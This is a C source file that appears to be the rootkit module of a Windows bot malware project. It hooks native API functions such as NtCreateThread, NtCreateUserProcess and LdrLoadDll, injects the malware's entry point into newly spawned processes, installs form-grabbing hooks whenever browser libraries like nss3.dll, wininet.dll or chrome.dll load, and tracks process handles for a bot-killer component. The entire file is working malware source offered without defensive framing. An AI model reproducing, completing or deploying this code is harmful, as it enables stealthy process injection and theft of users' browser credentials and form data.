#include "rootkit.h"

#ifdef MODULE_ROOTKIT
#include "ntheader.h"
#include "hook.h"
#include "botThreads.h"
#include "mem.h"
#include "utils.h"
#include "inject.h"
#include "zombie.h"
#include "string.h"

#ifdef MODULE_BOTKILLER
#include "botkiller.h"
#endif

#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"

#endif

extern bot_t bot;

BOOL WINAPI InitializeRootkit(void)
{
	dwOtherEntryPoint(NULL);
	return TRUE;
}

DWORD WINAPI malwareEntryPoint(void)
{
	if (!InitializeRootkit())
		return 0;

	HMODULE hMod;

	if ((hMod = bot.api.pGetModuleHandleW(NULL)) == 0)
		return 0;

	if (((PIMAGE_DOS_HEADER)hMod)->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hMod + ((PIMAGE_DOS_HEADER)hMod)->e_lfanew);
		if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			LPBYTE entry = ntHeaders->OptionalHeader.AddressOfEntryPoint + (LPBYTE)hMod;
			return ((PROC)entry)();
		}
	}

	return 0;
}

ptNtCreateThread oNtCreateThread;

NTSTATUS WINAPI NtCreateThread_Callback(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PCLIENT_ID ClientId, PCONTEXT ThreadContext, PINITIAL_TEB InitialTeb, BOOLEAN CreateSuspended)
{
	DWORD dwPbiSize, dwThreadCount, dwEntryPoint;
	PROCESS_BASIC_INFORMATION pbi;
	memzero(&pbi, sizeof(PROCESS_BASIC_INFORMATION));

	if (bot.api.pNtQueryInformationProcess(ProcessHandle, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &dwPbiSize) >= 0 && pbi.PebBaseAddress != 0)
	{
		dwThreadCount = pbi.UniqueProcessId == 0 ? 0 : GetCountOfThreadsByProcessId(pbi.UniqueProcessId);

		if (dwThreadCount == 0)
		{
			if ((dwEntryPoint = InjectCodeEx(ProcessHandle, malwareEntryPoint)) != 0)
			{
				ThreadContext->Eax = dwEntryPoint;
			}
		}
	}

	return oNtCreateThread(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, ClientId, ThreadContext, InitialTeb, CreateSuspended);
}

ptNtCreateUserProcess oNtCreateUserProcess;

NTSTATUS WINAPI NtCreateUserProcess_Callback(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList)
{
	NTSTATUS Result = oNtCreateUserProcess(processHandle, threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, createProcessFlags, createThreadFlags, processParameters, parameter9, attributeList);

	if (Result >= 0 && !IsCurrentThreadWhitelisted())
	{

	}

	return Result;
}

ptLdrLoadDll oLdrLoadDll;

NTSTATUS WINAPI LdrLoadDll_Callback(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle)
{
	NTSTATUS ldrLoadDllStatus, ldrGetDllHandleStatus;
	
	ldrGetDllHandleStatus = bot.api.pLdrGetDllHandle(pathToFile, NULL, moduleFileName, moduleHandle);
	ldrLoadDllStatus = oLdrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);

	if (!(ldrGetDllHandleStatus >= 0) && ldrLoadDllStatus >= 0 && moduleHandle != 0 && *moduleHandle != 0 && moduleFileName != 0)
	{
		if (StrCompareEndW(moduleFileName->Buffer, L"nss3.dll") || StrCompareEndW(moduleFileName->Buffer, L"nspr4.dll"))
		{
			InstallFormgrabberHooks();
		}
		else if (StrCompareEndW(moduleFileName->Buffer, L"wininet.dll"))
		{
			InstallFormgrabberHooks();
		}
		else if (StrCompareEndW(moduleFileName->Buffer, L"chrome.dll"))
		{
			InstallFormgrabberHooks();
		}
	}

	return ldrLoadDllStatus;
}

ptNtWriteVirtualMemory oNtWriteVirtualMemory;

NTSTATUS WINAPI NtWriteVirtualMemory_Callback(IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL)
{
	return oNtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

ptNtAllocateVirtualMemory oNtAllocateVirtualMemory;

NTSTATUS WINAPI NtAllocateVirtualMemory_Callback(IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN ULONG                ZeroBits,
	IN OUT PULONG           RegionSize,
	IN ULONG                AllocationType,
	IN ULONG                Protect)
{
	return oNtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

ptNtProtectVirtualMemory oNtProtectVirtualMemory;

NTSTATUS WINAPI NtProtectVirtualMemory_Callback(IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection)
{
	return oNtProtectVirtualMemory(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
}

ptNtDeviceIoControlFile oNtDeviceIoControlFile;

NTSTATUS WINAPI NtDeviceIoControlFile_Callback(IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	IN ULONG                IoControlCode,
	IN PVOID                InputBuffer OPTIONAL,
	IN ULONG                InputBufferLength,
	OUT PVOID               OutputBuffer OPTIONAL,
	IN ULONG                OutputBufferLength)
{
	return oNtDeviceIoControlFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength);
}

ptNtSetContextThread oNtSetContextThread;

NTSTATUS WINAPI NtSetContextThread_Callback(IN HANDLE               ThreadHandle,
	IN PCONTEXT             Context)
{
	return oNtSetContextThread(ThreadHandle, Context);
}

ptNtOpenProcess oNtOpenProcess;

NTSTATUS WINAPI NtOpenProcess_Callback(OUT PHANDLE             ProcessHandle,
	IN ACCESS_MASK          AccessMask,
	IN POBJECT_ATTRIBUTES   ObjectAttributes,
	IN PCLIENT_ID           ClientId)
{
	NTSTATUS Result = oNtOpenProcess(ProcessHandle, AccessMask, ObjectAttributes, ClientId);

	if (Result >= 0)
	{
		AddBotkillHandle(*ProcessHandle);
	}

	return Result;
}

ptNtClose oNtClose;

NTSTATUS WINAPI NtClose_Callback(HANDLE Handle)
{
	RemoveBotkillHandle(Handle);
	return oNtClose(Handle);
}

ptNtCreateFile oNtCreateFile;

NTSTATUS WINAPI NtCreateFile_Callback(_Out_    PHANDLE            FileHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_     POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_    PIO_STATUS_BLOCK   IoStatusBlock,
	_In_opt_ PLARGE_INTEGER     AllocationSize,
	_In_     ULONG              FileAttributes,
	_In_     ULONG              ShareAccess,
	_In_     ULONG              CreateDisposition,
	_In_     ULONG              CreateOptions,
	_In_     PVOID              EaBuffer,
	_In_     ULONG              EaLength)
{
	
	return oNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

BOOL WINAPI InstallRootkit(void)
{
	unsigned int i;
	DWORD dwLength = 0;
	BOOL bSuccess = FALSE;

	hook_t hooks[] =
	{
		{bot.api.pNtCreateThread, &NtCreateThread_Callback, (LPVOID*)&oNtCreateThread},
		{bot.api.pLdrLoadDll, &LdrLoadDll_Callback, (LPVOID*)&oLdrLoadDll},
		{bot.api.pNtWriteVirtualMemory, &NtWriteVirtualMemory_Callback, (LPVOID*)&oNtWriteVirtualMemory},
		{bot.api.pNtAllocateVirtualMemory, &NtAllocateVirtualMemory_Callback, (LPVOID*)&oNtAllocateVirtualMemory},
		{bot.api.pNtProtectVirtualMemory, &NtProtectVirtualMemory_Callback, (LPVOID*)&oNtProtectVirtualMemory},
		{bot.api.pNtDeviceIoControlFile, &NtDeviceIoControlFile_Callback, (LPVOID*)&oNtDeviceIoControlFile},
		{bot.api.pNtSetContextThread, &NtSetContextThread_Callback, (LPVOID*)&oNtSetContextThread},
		{bot.api.pNtOpenProcess, &NtOpenProcess_Callback, (LPVOID*)&oNtOpenProcess},
		{bot.api.pNtClose, &NtClose_Callback, (LPVOID*)&oNtClose},
		{bot.api.pNtCreateFile, &NtCreateFile_Callback, (LPVOID*)&oNtCreateFile}
	};

	if (bot.api.pNtCreateUserProcess != 0)
	{
		hooks[0].lpFunctionAddress = bot.api.pNtCreateUserProcess;
		hooks[0].lpCallbackAddress = &NtCreateUserProcess_Callback;
		hooks[0].lpOriginalFunction = (LPVOID*)&oNtCreateUserProcess;
	}

	for (i = 0; i < sizeof(hooks) / sizeof(hook_t); i++)
	{
		*hooks[i].lpOriginalFunction = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (HookFunction(hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, *hooks[i].lpOriginalFunction, &dwLength))
			bSuccess = TRUE;
	}

	return bSuccess;
}

static DWORD _RVAToOffset(DWORD dwRVA, DWORD dwVA, DWORD dwRaw)
{
	return dwRVA - dwVA + dwRaw;
}

static void _UnhookModule(HMODULE hMod, const LPWSTR pwzOriginalModulePath)
{
	DWORD dwFileSize, dwOffset, dwNamePos, dwNumbPos, dwFuncPos;
	LPVOID pOriginalModule, pOriginalFunctionAddress;
	PIMAGE_DOS_HEADER pFileHeader;
	PIMAGE_NT_HEADERS pFileNtHeaders;
	PIMAGE_SECTION_HEADER pFileSectionHeader;
	PIMAGE_EXPORT_DIRECTORY ied;
	LPSTR pszFunction;

	unsigned int i;

	dwFileSize = 0;
	pFileSectionHeader = NULL;
	pFileHeader = NULL;
	pFileNtHeaders = NULL;

	if ((pOriginalModule = ReadFileFromDisk(pwzOriginalModulePath, &dwFileSize)) == NULL)
		return;

	pFileHeader = (PIMAGE_DOS_HEADER)pOriginalModule;

	if (pFileHeader->e_magic == IMAGE_DOS_SIGNATURE)
	{
		pFileNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)pOriginalModule + pFileHeader->e_lfanew);

		if (pFileNtHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			if (pFileNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress > 0 && pFileNtHeaders->OptionalHeader.DataDirectory[0].Size > 0)
			{
				for (i = 0; i < pFileNtHeaders->FileHeader.NumberOfSections; i++)
				{
					pFileSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOriginalModule + pFileHeader->e_lfanew + 248 + i * 40);

					if (pFileNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress >= pFileSectionHeader->VirtualAddress && pFileNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress <= (pFileSectionHeader->VirtualAddress + pFileSectionHeader->Misc.VirtualSize))
					{
						dwOffset = _RVAToOffset(pFileNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress, pFileSectionHeader->VirtualAddress, pFileSectionHeader->PointerToRawData);
						break;
					}
				}

				ied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pOriginalModule + dwOffset);

				for (i = 0; i < ied->NumberOfNames; i++)
				{
					dwNamePos = 0;
					dwNumbPos = 0;
					dwFuncPos = 0;

					dwOffset = _RVAToOffset((DWORD)ied->AddressOfNames, pFileSectionHeader->VirtualAddress, pFileSectionHeader->PointerToRawData);
					dwNamePos = (DWORD)((DWORD)pOriginalModule + dwOffset + i * 4);
					dwNamePos = _RVAToOffset(dwNamePos, pFileSectionHeader->VirtualAddress, pFileSectionHeader->PointerToRawData);

					pszFunction = (LPSTR)((DWORD)pOriginalModule + dwNamePos);
					MessageBoxA(0, pszFunction, 0, 0);

				}
			}
		}
	}
}

void WINAPI UnhookProcess(void)
{
	HANDLE hSnapshot;
	MODULEENTRY32W me32;
	wchar_t wzModulePath[MAX_PATH];

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0)) == INVALID_HANDLE_VALUE)
		return;

	memzero(&me32, sizeof(MODULEENTRY32W));
	me32.dwSize = sizeof(MODULEENTRY32W);

	if (Module32FirstW(hSnapshot, &me32))
	{
		do
		{
			memzero(&wzModulePath, sizeof(wzModulePath));
			
			if (bot.api.pGetModuleFileNameW(me32.hModule, wzModulePath, MAX_PATH) == 0)
				continue;

			_UnhookModule(me32.hModule, wzModulePath);
		} 
		while (Module32NextW(hSnapshot, &me32));
	}

}

#endif